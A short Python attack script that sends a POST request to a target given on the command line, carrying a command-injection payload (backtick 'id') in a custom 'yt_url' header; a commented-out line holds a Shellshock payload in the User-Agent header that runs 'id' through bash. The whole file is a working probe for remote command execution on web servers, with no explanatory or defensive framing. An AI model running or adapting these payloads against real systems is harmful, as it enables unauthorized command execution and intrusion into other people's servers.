#!/usr/bin/python

import requests, sys

ip = sys.argv[1]

#agent = {'User-Agent':"() { :; }; echo; echo; /bin/bash -c 'id'"}

agent = {'yt_url':'`id`'}

r =  requests.post(url=ip, headers=agent)
print (r.json)
